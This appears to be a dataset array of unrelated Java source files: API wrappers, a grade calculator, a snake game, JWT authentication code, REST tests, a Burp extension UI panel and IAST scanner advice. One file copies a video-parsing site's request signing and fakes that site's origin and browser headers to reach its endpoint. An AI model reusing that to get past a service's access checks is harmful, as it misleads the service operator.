    "import com.google.gson.JsonParser;\nimport com.google.gson.JsonSyntaxException;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Scanner;\n\nclass HopliteAPI {\n    private static final String BASE_URL = \"https://hopliteapi.isabel.gg/api/stats\";\n    private static final int TIMEOUT_SECONDS = 10;\n\n    public String getRoyaleStats(String username) throws IOException {\n        /*\n         * Returns Battle Royale stats for the player\n         */\n        return makeRequest(BASE_URL + \"/royale/\" + username);\n    }\n\n    public String getDuelsStats(String username) throws IOException {\n        /*\n         * Returns Duels stats for the player\n         */\n        return makeRequest(BASE_URL + \"/duels/\" + username);\n    }\n\n    private String makeRequest(String urlString) throws IOException {\n        URL url = new URL(urlString);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setReadTimeout(TIMEOUT_SECONDS * 1000);\n        connection.setConnectTimeout(TIMEOUT_SECONDS * 1000);\n\n        try {\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                try (InputStream inputStream = connection.getInputStream();\n                     InputStreamReader inputStreamReader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {\n                    StringBuilder response = new StringBuilder();\n                    Scanner scanner = new Scanner(inputStreamReader);\n                    while (scanner.hasNextLine()) {\n                        response.append(scanner.nextLine());\n                    }\n                    return JsonParser.parseString(response.toString()).toString();\n                } catch (JsonSyntaxException e) {\n                    throw new IOException(\"Failed to parse JSON response\", e);\n                }\n            } else {\n                throw new IOException(\"HTTP error code: \" + responseCode);\n            }\n        } finally {\n            connection.disconnect();\n        }\n    }\n}\n\npublic class wrapper {\n    public static void main(String[] args) {\n        HopliteAPI api = new HopliteAPI();\n        String username = \"flowtives\";\n\n        try {\n            String royaleStats = api.getRoyaleStats(username);\n            System.out.println(royaleStats);\n\n            String duelsStats = api.getDuelsStats(username);\n            System.out.println(duelsStats);\n        } catch (IOException e) {\n            System.err.println(\"Error fetching stats: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}",
    "//import javax.swing.*;\r\n//import java.awt.*;\r\n//import java.awt.event.ActionEvent;\r\n//\r\n//public class GradeCalculator extends JFrame {\r\n//    private JComboBox<String> courseTypeComboBox;\r\n//    private JTextField[] quizFields = new JTextField[4];\r\n//    private JTextField[] assignmentFields = new JTextField[4];\r\n//    private JTextField[] labAssignmentFields = new JTextField[4];\r\n//    private JTextField midField, finalField, labMidField, labFinalField;\r\n//    private JTextField totalQuizMarksField, totalAssignmentMarksField, totalMidMarksField, totalFinalMarksField;\r\n//    private JButton calculateButton;\r\n//    private JLabel gradeLabel;\r\n//\r\n//    public GradeCalculator() {\r\n//        setTitle(\"Advanced Grade Calculator\");\r\n//        setSize(600, 550);\r\n//        setDefaultCloseOperation(EXIT_ON_CLOSE);\r\n//        initializeUI();\r\n//    }\r\n//\r\n//    private void initializeUI() {\r\n//        JPanel panel = new JPanel(new GridLayout(0, 2, 5, 5));\r\n//\r\n//        panel.add(new JLabel(\"Course Type:\"));\r\n//        courseTypeComboBox = new JComboBox<>(new String[]{\"Theory\", \"Theory+Lab\"});\r\n//        courseTypeComboBox.addActionListener(e -> updateFieldVisibility());\r\n//        panel.add(courseTypeComboBox);\r\n//\r\n//        panel.add(new JLabel(\"Total Quiz Marks (Default 15):\"));\r\n//        totalQuizMarksField = new JTextField(\"15\");\r\n//        panel.add(totalQuizMarksField);\r\n//\r\n//        panel.add(new JLabel(\"Total Assignment Marks (Default 10):\"));\r\n//        totalAssignmentMarksField = new JTextField(\"10\");\r\n//        panel.add(totalAssignmentMarksField);\r\n//\r\n//        for (int i = 0; i < 4; i++) {\r\n//            panel.add(new JLabel(\"Quiz \" + (i + 1) + \" Marks:\"));\r\n//            quizFields[i] = new JTextField();\r\n//            panel.add(quizFields[i]);\r\n//\r\n//            panel.add(new JLabel(\"Assignment \" + (i + 1) + \" Marks:\"));\r\n//            assignmentFields[i] = new JTextField();\r\n//            panel.add(assignmentFields[i]);\r\n//\r\n//            panel.add(new JLabel(\"Lab Assignment \" + (i + 1) + \" Marks:\"));\r\n//            labAssignmentFields[i] = new JTextField();\r\n//            panel.add(labAssignmentFields[i]);\r\n//        }\r\n//\r\n//        panel.add(new JLabel(\"Total Mid Marks (Default 25):\"));\r\n//        totalMidMarksField = new JTextField(\"25\");\r\n//        panel.add(totalMidMarksField);\r\n//\r\n//        panel.add(new JLabel(\"Mid Marks:\"));\r\n//        midField = new JTextField();\r\n//        panel.add(midField);\r\n//\r\n//        panel.add(new JLabel(\"Total Final Marks (Default 50):\"));\r\n//        totalFinalMarksField = new JTextField(\"50\");\r\n//        panel.add(totalFinalMarksField);\r\n//\r\n//        panel.add(new JLabel(\"Final Marks:\"));\r\n//        finalField = new JTextField();\r\n//        panel.add(finalField);\r\n//\r\n//        // Lab-specific fields\r\n//        panel.add(new JLabel(\"Lab Mid Marks (Default 25):\"));\r\n//        labMidField = new JTextField(\"25\");\r\n//        panel.add(labMidField);\r\n//\r\n//        panel.add(new JLabel(\"Lab Final Marks (Default 50):\"));\r\n//        labFinalField = new JTextField(\"50\");\r\n//        panel.add(labFinalField);\r\n//\r\n//        calculateButton = new JButton(\"Calculate Grade\");\r\n//        calculateButton.addActionListener(this::calculateGrade);\r\n//        panel.add(calculateButton);\r\n//\r\n//        gradeLabel = new JLabel(\"Grade: \");\r\n//        panel.add(gradeLabel);\r\n//\r\n//        add(new JScrollPane(panel), BorderLayout.CENTER);\r\n//\r\n//        updateFieldVisibility(); // Initial visibility setup\r\n//        setVisible(true);\r\n//    }\r\n//\r\n//    private void updateFieldVisibility() {\r\n//        boolean isLab = courseTypeComboBox.getSelectedItem().equals(\"Theory+Lab\");\r\n//        for (JTextField labAssignmentField : labAssignmentFields) {\r\n//            labAssignmentField.setVisible(isLab);\r\n//        }\r\n//        labMidField.setVisible(isLab);\r\n//        labFinalField.setVisible(isLab);\r\n//        this.pack();\r\n//    }\r\n//\r\n//    private void calculateGrade(ActionEvent e) {\r\n//        try {\r\n//            int totalQuizMarks = Integer.parseInt(totalQuizMarksField.getText());\r\n//            int totalAssignmentMarks = Integer.parseInt(totalAssignmentMarksField.getText());\r\n//            int totalMidMarks = Integer.parseInt(totalMidMarksField.getText());\r\n//            int totalFinalMarks = Integer.parseInt(totalFinalMarksField.getText());\r\n//\r\n//            double quizSum = 0, assignmentSum = 0, labAssignmentSum = 0;\r\n//            for (int i = 0; i < 4; i++) {\r\n//                quizSum += Double.parseDouble(quizFields[i].getText()) / totalQuizMarks * 100;\r\n//                assignmentSum += Double.parseDouble(assignmentFields[i].getText()) / totalAssignmentMarks * 100;\r\n//                if (courseTypeComboBox.getSelectedItem().equals(\"Theory+Lab\")) {\r\n//                    labAssignmentSum += Double.parseDouble(labAssignmentFields[i].getText()); // Assuming 100 is total for each lab assignment\r\n//                }\r\n//            }\r\n//            double mid = Double.pars",
    "import java.io.*;\n\npublic class EasyLevel extends SnakeGame {\n\n    EasyLevel(int boardWidth, int boardHeight, int selectedFood) {\n        super(boardWidth, boardHeight, selectedFood);\n\n        loadBestScore();\n        addObstacles();\n        placeFood(selectedFood);\n    }\n\n    private void loadBestScore() {\n        try {\n            File file = new File(\"easy_level_best_score.txt\");\n            if (file.exists()) {\n                BufferedReader br = new BufferedReader(new FileReader(file));\n                String line = br.readLine();\n                if (line != null) {\n                    bestScore = Integer.parseInt(line);\n                }\n                br.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void updateBestScore() {\n        super.updateBestScore();\n        try {\n            File file = new File(\"easy_level_best_score.txt\");\n            BufferedWriter writer = new BufferedWriter(new FileWriter(file));\n            writer.write(String.valueOf(bestScore));\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void addObstacles() {\n    }\n}\n",
    "package my.project.moviesbox.model;\n\nimport androidx.annotation.NonNull;\n\nimport com.alibaba.fastjson.JSONObject;\nimport com.google.firebase.crashlytics.buildtools.reloc.org.apache.commons.codec.binary.Base64;\n\nimport java.io.IOException;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.security.MessageDigest;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\n\nimport my.project.moviesbox.contract.ParsingInterfacesContract;\nimport my.project.moviesbox.net.OkHttpUtils;\nimport my.project.moviesbox.parser.LogUtil;\nimport okhttp3.Call;\nimport okhttp3.Callback;\nimport okhttp3.FormBody;\nimport okhttp3.Headers;\nimport okhttp3.Response;\n\n/**\n * @author Li\n * @version 1.0\n * @description: \u6ce8\u91ca\n * @date 2024/2/21 8:37\n */\npublic class ParsingInterfacesModel extends BaseModel implements ParsingInterfacesContract.Model {\n    private final static String XMJX = \"https://122.228.8.29:4433/xmflv.js\";\n    private final static String AES_IV = \"3cccf88181408f19\";\n\n    @Override\n    public void parser(String url, ParsingInterfacesContract.LoadDataCallback callback) {\n        try {\n            url = URLEncoder.encode(url, \"UTF-8\");\n            LogUtil.logInfo(\"url\", url);\n            // \u65f6\u95f4\u6233\n            long time = System.currentTimeMillis();\n            String data = time+url;\n            LogUtil.logInfo(\"data\", data);\n            String dataMd5 = MD5(data);\n            LogUtil.logInfo(\"dataMd5\", dataMd5);\n            String aesKey = MD5(dataMd5);\n            LogUtil.logInfo(\"aesKry\", aesKey);\n            String signData = \"\";\n            try {\n                IvParameterSpec iv = new IvParameterSpec(AES_IV.getBytes(StandardCharsets.UTF_8));\n                SecretKeySpec sKeySpec = new SecretKeySpec(aesKey.getBytes(StandardCharsets.UTF_8), \"AES\");\n                Cipher cipher = Cipher.getInstance(\"AES/CBC/NoPadding\");\n                cipher.init(Cipher.ENCRYPT_MODE, sKeySpec, iv);\n                byte[] encrypted = cipher.doFinal(dataMd5.getBytes(StandardCharsets.UTF_8));\n                signData = Base64.encodeBase64String(encrypted);\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n            LogUtil.logInfo(\"signData\", signData);\n            Headers.Builder headersBuilder = new Headers.Builder();\n            headersBuilder.set(\"Accept\", \"application/json, text/javascript, */*; q=0.01\");\n            headersBuilder.set(\"Accept-Encoding\", \"gzip, deflate, br\");\n            headersBuilder.set(\"Accept-Language\", \"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\");\n            headersBuilder.set(\"Content-Type\", \"application/x-www-form-urlencoded; charset=UTF-8\");\n            headersBuilder.set(\"Origin\", \"https://jx.xmflv.cc\");\n            headersBuilder.set(\"Sec-Ch-Ua\", \"\\\"Not A(Brand\\\";v=\\\"99\\\", \\\"Microsoft Edge\\\";v=\\\"121\\\", \\\"Chromium\\\";v=\\\"121\\\"\");\n            headersBuilder.set(\"Sec-Ch-Ua-Mobile\", \"?0\");\n            headersBuilder.set(\"Sec-Ch-Ua-Platform\", \"\\\"Windows\\\"\");\n            headersBuilder.set(\"Sec-Fetch-Dest\", \"empty\");\n            headersBuilder.set(\"Sec-Fetch-Mode\", \"cors\");\n            headersBuilder.set(\"Sec-Fetch-Site\", \"cross-site\");\n            headersBuilder.set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0\");\n            FormBody.Builder formBodyBuilder = new FormBody.Builder();\n            formBodyBuilder.add(\"wap\", \"1\")\n                    .add(\"url\", url)\n                    .add(\"time\", String.valueOf(time))\n                    .add(\"key\", signData);\n            OkHttpUtils.getInstance().doPostDefault(XMJX, headersBuilder.build(), formBodyBuilder.build(), new Callback() {\n                @Override\n                public void onFailure(@NonNull Call call, @NonNull IOException e) {\n                    callback.error(\"\u9519\u8bef\uff1a\" + e.getMessage());\n                }\n\n                @Override\n                public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {\n                    try {\n                        String responseBody = getBody(response);\n                        JSONObject jsonObject = JSONObject.parseObject(responseBody);\n                        LogUtil.logInfo(\"responseBody\", jsonObject.toJSONString());\n                        callback.success(jsonObject);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                        callback.error(\"\u9519\u8bef\uff1a\" + e.getMessage());\n                    }\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n            callback.error(\"\u9519\u8bef\uff1a\"+e.getMessage());\n        }\n    }\n\n    public static String MD5(String input) {\n        try {\n            // \u521b\u5efaMD5\u6d88\u606f\u6458\u8981\u5bf9\u8c61\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            // \u5c06\u8f93\u5165\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5b57\u8282\u6570\u7ec4\uff0c\u5e76\u8ba1\u7b97\u6458\u8981\n            byte[] messageDigest = md.digest(input.getBytes());\n     ",
    "package com.coffeewithdeveloper.coffeewithdeveloper.Security;\n\nimport com.coffeewithdeveloper.coffeewithdeveloper.Services.Implementation.UserDetailsServiceImpl;\nimport jakarta.servlet.FilterChain;\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.core.context.SecurityContextHolder;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.web.authentication.WebAuthenticationDetailsSource;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.filter.OncePerRequestFilter;\n\nimport java.io.IOException;\n\n@Component\npublic class JwtAuthFilter extends OncePerRequestFilter {\n    private final JwtService jwtService;\n    final UserDetailsServiceImpl userDetailsServiceImpl;\n\n    public JwtAuthFilter(JwtService jwtService, UserDetailsServiceImpl userDetailsServiceImpl) {\n        this.jwtService = jwtService;\n        this.userDetailsServiceImpl = userDetailsServiceImpl;\n    }\n\n    @Override\n    protected void doFilterInternal(\n            HttpServletRequest request,\n            HttpServletResponse response,\n            FilterChain filterChain)\n                throws ServletException, IOException {\n\n        String authHeader = request.getHeader(\"Authorization\");\n        String token = null;\n        String username = null;\n        if(authHeader != null && authHeader.startsWith(\"Bearer \")){\n            token = authHeader.substring(7);\n            username = jwtService.extractUsername(token);\n        }\n\n        if(username != null && SecurityContextHolder.getContext().getAuthentication() == null){\n            UserDetails userDetails = userDetailsServiceImpl.loadUserByUsername(username);\n            if(jwtService.validateToken(token, userDetails)){\n                UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());\n                authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));\n                SecurityContextHolder.getContext().setAuthentication(authenticationToken);\n            }\n        }\n\n        filterChain.doFilter(request, response);\n    }\n}\n",
    "/*\n * The MIT License\n *\n * Copyright 2024 Karate Labs Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage io.karatelabs.js;\n\npublic class JsError extends JsFunction {\n\n    private final String name;\n\n    public JsError(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public Object invoke(Object instance, Object... args) {\n        JsObject object = new JsObject();\n        if (args.length > 0) {\n            object.put(\"message\", args[0]);\n        }\n        return object;\n    }\n\n    @Override\n    public String toString() {\n        return name;\n    }\n\n}\n",
    "package com.divide.by.zero.security.service;\n\nimport com.divide.by.zero.security.repository.TokenRepository;\nimport com.divide.by.zero.security.repository.UserRepository;\nimport com.divide.by.zero.security.token.Token;\nimport com.divide.by.zero.security.token.TokenType;\nimport com.divide.by.zero.security.user.Role;\nimport com.divide.by.zero.security.user.User;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport ${groupId}.openapi.model.AuthenticationRequest;\nimport ${groupId}.openapi.model.AuthenticationResponse;\nimport ${groupId}.openapi.model.RegistrationRequest;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.http.HttpHeaders;\nimport org.springframework.security.authentication.AuthenticationManager;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.stereotype.Service;\n\nimport java.io.IOException;\n\n@Service\n@RequiredArgsConstructor\npublic class AuthenticationService {\n    private final UserRepository repository;\n    private final TokenRepository tokenRepository;\n    private final PasswordEncoder passwordEncoder;\n    private final JwtService jwtService;\n    private final AuthenticationManager authenticationManager;\n\n    public AuthenticationResponse register(RegistrationRequest request) {\n        var user = User.builder()\n                .firstname(request.getFirstName())\n                .lastname(request.getLastName())\n                .email(request.getEmail())\n                .password(passwordEncoder.encode(request.getPassword()))\n                .role(Role.USER)\n                .build();\n        var savedUser = repository.save(user);\n        var jwtToken = jwtService.generateToken(user);\n        var refreshToken = jwtService.generateRefreshToken(user);\n        saveUserToken(savedUser, jwtToken);\n        AuthenticationResponse authenticationResponse = new AuthenticationResponse();\n        authenticationResponse.setAccessToken(jwtToken);\n        authenticationResponse.setRefreshToken(refreshToken);\n\n        return authenticationResponse;\n    }\n\n    public AuthenticationResponse authenticate(AuthenticationRequest request) {\n        authenticationManager.authenticate(\n                new UsernamePasswordAuthenticationToken(\n                        request.getEmail(),\n                        request.getPassword()\n                )\n        );\n        var user = repository.findByEmail(request.getEmail())\n                .orElseThrow();\n        var jwtToken = jwtService.generateToken(user);\n        var refreshToken = jwtService.generateRefreshToken(user);\n        revokeAllUserTokens(user);\n        saveUserToken(user, jwtToken);\n\n        var response = new AuthenticationResponse();\n        response.setAccessToken(jwtToken);\n        response.setRefreshToken(refreshToken);\n\n        return response;\n    }\n\n    private void saveUserToken(User user, String jwtToken) {\n        var token = Token.builder()\n                .user(user)\n                .token(jwtToken)\n                .tokenType(TokenType.BEARER)\n                .expired(false)\n                .revoked(false)\n                .build();\n        tokenRepository.save(token);\n    }\n\n    private void revokeAllUserTokens(User user) {\n        var validUserTokens = tokenRepository.findAllValidTokenByUser(user.getId());\n        if (validUserTokens.isEmpty())\n            return;\n        validUserTokens.forEach(token -> {\n            token.setExpired(true);\n            token.setRevoked(true);\n        });\n        tokenRepository.saveAll(validUserTokens);\n    }\n\n    public void refreshToken(\n            HttpServletRequest request,\n            HttpServletResponse response\n    ) throws IOException {\n        final String authHeader = request.getHeader(HttpHeaders.AUTHORIZATION);\n        final String refreshToken;\n        final String userEmail;\n        if (authHeader == null || !authHeader.startsWith(\"Bearer \")) {\n            return;\n        }\n        refreshToken = authHeader.substring(7);\n        userEmail = jwtService.extractUsername(refreshToken);\n        if (userEmail != null) {\n            var user = this.repository.findByEmail(userEmail)\n                    .orElseThrow();\n            if (jwtService.isTokenValid(refreshToken, user)) {\n                var accessToken = jwtService.generateToken(user);\n                revokeAllUserTokens(user);\n                saveUserToken(user, accessToken);\n                var authResponse = new AuthenticationResponse();\n                authResponse.accessToken(accessToken);\n                authResponse.refreshToken(refreshToken);\n                new ObjectMapper().writeValue(response.getOutputStream(), authResponse);\n            }\n        }\n    }\n}\n",
    "package tests;\n\nimport org.junit.jupiter.api.Test;\n\nimport java.sql.Array;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport static io.restassured.RestAssured.given;\nimport static io.restassured.http.ContentType.JSON;\nimport static org.hamcrest.Matchers.*;\n\npublic class ReqresInTest {\n\n    @Test\n    void createUser() {\n\n        String data = \"{\\n\" +\n                \"    \\\"name\\\": \\\"morpheus\\\",\\n\" +\n                \"    \\\"job\\\": \\\"leader\\\"\\n\" +\n                \"}\";\n\n        given()\n                .body(data)\n                .contentType(JSON)\n                .log().uri()\n\n                .when()\n                .post(\"https://reqres.in/api/users\")\n\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(201)\n                .body(\"job\", is(\"leader\"));\n    }\n\n    @Test\n    void deleteUser() {\n        given()\n                .log().uri()\n\n                .when()\n                .delete(\"https://reqres.in/api/users/2\")\n\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(204);\n    }\n\n    @Test\n    void updateUser() {\n\n        String data = \"{\\n\" +\n                \"    \\\"name\\\": \\\"morpheus\\\",\\n\" +\n                \"    \\\"job\\\": \\\"zion resident\\\"\\n\" +\n                \"}\";\n\n        given()\n                .body(data)\n                .contentType(JSON)\n                .log().uri()\n\n                .when()\n                .patch(\"https://reqres.in/api/users/2\")\n\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(200)\n                .body(\"job\", is(\"zion resident\"));;\n    }\n\n    @Test\n    void successfulRegistration() {\n\n        String data = \"{\\n\" +\n                \"    \\\"email\\\": \\\"eve.holt@reqres.in\\\",\\n\" +\n                \"    \\\"password\\\": \\\"pistol\\\"\\n\" +\n                \"}\";\n\n        given()\n                .body(data)\n                .contentType(JSON)\n                .log().uri()\n\n                .when()\n                .post(\"https://reqres.in/api/register\")\n\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(200)\n                .body(\"token\", is(\"QpwL5tke4Pnpja7X4\"));\n    }\n\n    @Test\n    void listUsers() {\n\n        List<String> items = List.of(\"Lawson\", \"Ferguson\", \"Funke\", \"Fields\", \"Edwards\", \"Howell\");\n\n        given()\n                .log().uri()\n\n                .when()\n                .get(\"https://reqres.in/api/users?page=2\")\n\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(200)\n                .body(\"per_page\", is(6))\n                .body(\"data.last_name\", hasItems(items.toArray()));\n    }\n\n}",
    "package burp.ui;\n\nimport burp.BurpExtender;\nimport burp.IHttpRequestResponse;\nimport burp.IMessageEditor;\nimport burp.ITextEditor;\nimport burp.util.UiUtils;\n\nimport javax.swing.*;\nimport javax.swing.border.EmptyBorder;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.awt.event.MouseAdapter;\nimport java.awt.event.MouseEvent;\nimport java.util.HashMap;\n\npublic class ConfigPanel extends JPanel {\n    public static IHttpRequestResponse currentlyDisplayedItem;\n    public static JLabel lbRequestCount;\n    public static JLabel lbSuccessCount;\n\n    public static IMessageEditor requestViewer;\n    public static IMessageEditor responseViewer;\n    public static ITextEditor resultDeViewer;\n\n    public static HashMap<String, JLabel> resultMap = new HashMap<>();\n    public static JPanel tagsPanel;\n\n    // \u5728FingerTab\u7c7b\u4e2d\u6dfb\u52a0\u6210\u5458\u53d8\u91cf\n    public static JToggleButton allFingerprintsButton;\n    public static JToggleButton toggleButton;\n    JCheckBox autoSendRequestCheckBox;\n    JCheckBox includeCookieCheckBox;\n\n    public ConfigPanel() {\n\n        GridBagLayout gridBagLayout = new GridBagLayout();\n        // \u5217\u6570\uff0c\u884c\u6570\n        gridBagLayout.columnWidths = new int[] { 0, 0};\n        gridBagLayout.rowHeights = new int[] {5};\n        // \u5404\u5217\u5360\u5bbd\u5ea6\u6bd4\uff0c\u5404\u884c\u5360\u9ad8\u5ea6\u6bd4\n        gridBagLayout.columnWeights = new double[] { 1.0D, Double.MIN_VALUE };\n        setLayout(gridBagLayout);\n\n        JPanel FilterPanel = new JPanel();\n        GridBagConstraints gbc_panel_1 = new GridBagConstraints();\n        gbc_panel_1.insets = new Insets(0, 5, 5, 5);\n        gbc_panel_1.fill = 2;\n        gbc_panel_1.gridx = 0;\n        gbc_panel_1.gridy = 2;\n        add(FilterPanel, gbc_panel_1);\n        GridBagLayout gbl_panel_1 = new GridBagLayout();\n        gbl_panel_1.columnWidths = new int[] { 0, 0, 0, 0, 0 };\n        gbl_panel_1.rowHeights = new int[] { 0, 0 };\n        gbl_panel_1.columnWeights = new double[] { 0.0D, 0.0D, 0.0D, 0.0D, 0.0D, 0.0D, 0.0D, 0.0D, 0.0D, Double.MIN_VALUE};\n        gbl_panel_1.rowWeights = new double[] { 0.0D, Double.MIN_VALUE };\n        FilterPanel.setLayout(gbl_panel_1);\n\n        // \u5728\u6dfb\u52a0 \"Requests Total\" \u548c lbRequestCount \u4e4b\u524d\u6dfb\u52a0\u4e00\u4e2a\u5360\u4f4d\u7ec4\u4ef6\n        Component leftStrut = Box.createHorizontalStrut(5); // \u4f60\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8c03\u6574\u8fd9\u4e2a\u503c\n        GridBagConstraints gbc_leftStrut = new GridBagConstraints();\n        gbc_leftStrut.insets = new Insets(0, 0, 0, 5);\n        gbc_leftStrut.fill = GridBagConstraints.HORIZONTAL;\n        gbc_leftStrut.weightx = 1.0; // \u8fd9\u4e2a\u503c\u51b3\u5b9a\u4e86 leftStrut \u5360\u636e\u7684\u7a7a\u95f4\u5927\u5c0f\n        gbc_leftStrut.gridx = 10;\n        gbc_leftStrut.gridy = 0;\n        FilterPanel.add(leftStrut, gbc_leftStrut);\n\n        // \u8f6c\u53d1url\u603b\u6570\uff0c\u9ed8\u8ba40\n        JLabel lbRequest = new JLabel(\"Requests Total:\");\n        GridBagConstraints gbc_lbRequest = new GridBagConstraints();\n        gbc_lbRequest.insets = new Insets(0, 0, 0, 5);\n        gbc_lbRequest.fill = GridBagConstraints.HORIZONTAL;\n        gbc_lbRequest.weightx = 0.0;\n        gbc_lbRequest.gridx = 0;\n        gbc_lbRequest.gridy = 0;\n        FilterPanel.add(lbRequest, gbc_lbRequest);\n\n        lbRequestCount = new JLabel(\"0\");\n        lbRequestCount.setForeground(new Color(0,0,255));\n        GridBagConstraints gbc_lbRequestCount = new GridBagConstraints();\n        gbc_lbRequestCount.insets = new Insets(0, 0, 0, 5);\n        gbc_lbRequest.fill = GridBagConstraints.HORIZONTAL;\n        gbc_lbRequest.weightx = 0.0;\n        gbc_lbRequestCount.gridx = 1;\n        gbc_lbRequestCount.gridy = 0;\n        FilterPanel.add(lbRequestCount, gbc_lbRequestCount);\n\n        // \u8f6c\u53d1\u6210\u529furl\u6570\uff0c\u9ed8\u8ba40\n        JLabel lbSucces = new JLabel(\"JsFinder Success:\");\n        GridBagConstraints gbc_lbSucces = new GridBagConstraints();\n        gbc_lbSucces.insets = new Insets(0, 0, 0, 5);\n        gbc_lbSucces.fill = 0;\n        gbc_lbSucces.gridx = 2;\n        gbc_lbSucces.gridy = 0;\n        FilterPanel.add(lbSucces, gbc_lbSucces);\n\n        lbSuccessCount = new JLabel(\"0\");\n        lbSuccessCount.setForeground(new Color(0, 255, 0));\n        GridBagConstraints gbc_lbSuccessCount = new GridBagConstraints();\n        gbc_lbSuccessCount.insets = new Insets(0, 0, 0, 5);\n        gbc_lbSuccessCount.fill = 0;\n        gbc_lbSuccessCount.gridx = 3;\n        gbc_lbSuccessCount.gridy = 0;\n        FilterPanel.add(lbSuccessCount, gbc_lbSuccessCount);\n\n        // \u521d\u59cb\u5316\u6309\u94ae\n//        allFingerprintsButton = new JToggleButton(UiUtils.getImageIcon(\"/icon/allButtonIcon.png\", 30, 30));\n//        allFingerprintsButton.setSelectedIcon(UiUtils.getImageIcon(\"/icon/importantButtonIcon.png\", 30, 30));\n//        allFingerprintsButton.setPreferredSize(new Dimension(30, 30));\n//        allFingerprintsButton.setBorder(null);  // \u8bbe\u7f6e\u65e0\u8fb9\u6846\n//        allFingerprintsButton.setFocusPainted(false);  // \u79fb\u9664\u7126\u70b9\u8fb9\u6846\n//        allFingerprintsButton.setContentAreaFilled(false);  // \u79fb\u9664\u9009\u4e2d\u72b6\u6001\u4e0b\u7684\u80cc\u666f\u586b\u5145\n//        allFingerprintsButton.setToolTipText(\"\u6307\u7eb9\u5339\u914d\uff1a\u6240\u6709\u6307\u7eb9\");\n        toggleButton = new JToggleButton(UiUtils.getImageIcon(\"/icon/openButtonIcon.png\", 40, 24));\n        toggleButton.setSelectedIcon(UiUtils.getImageIcon",
    "package cn.bestsec.vulcheck.agent.advice;\n\nimport cn.bestsec.vulcheck.spy.Dispatcher;\nimport cn.bestsec.vulcheck.spy.DispatcherHandler;\nimport cn.bestsec.vulcheck.spy.OriginCaller;\nimport net.bytebuddy.asm.Advice;\nimport net.bytebuddy.description.method.MethodDescription;\nimport net.bytebuddy.implementation.bytecode.assign.Assigner;\n\nimport java.lang.reflect.Executable;\nimport java.util.HashMap;\n\n/**\n * \u6c61\u70b9\u4f20\u64ad\u8282\u70b9\u5904\u7406\u903b\u8f91\n * @author hjxin\n * @since 2023/11/15\n */\npublic class PropagatorAdvice {\n\n    @Advice.OnMethodEnter\n    public static void enter(@Advice.Origin Class<?> cls, @Advice.This Object caller, @Advice.Origin Executable exe,\n                             @Advice.AllArguments Object[] args, @Advice.Local(\"originalCaller\") OriginCaller originalCaller){\n        Dispatcher dispatcher = DispatcherHandler.getDispatcher();\n        originalCaller = dispatcher.enterPropagator(cls, caller, exe, args);\n    }\n\n    @Advice.OnMethodExit(onThrowable = Throwable.class)\n    public static void exit(@Advice.Origin 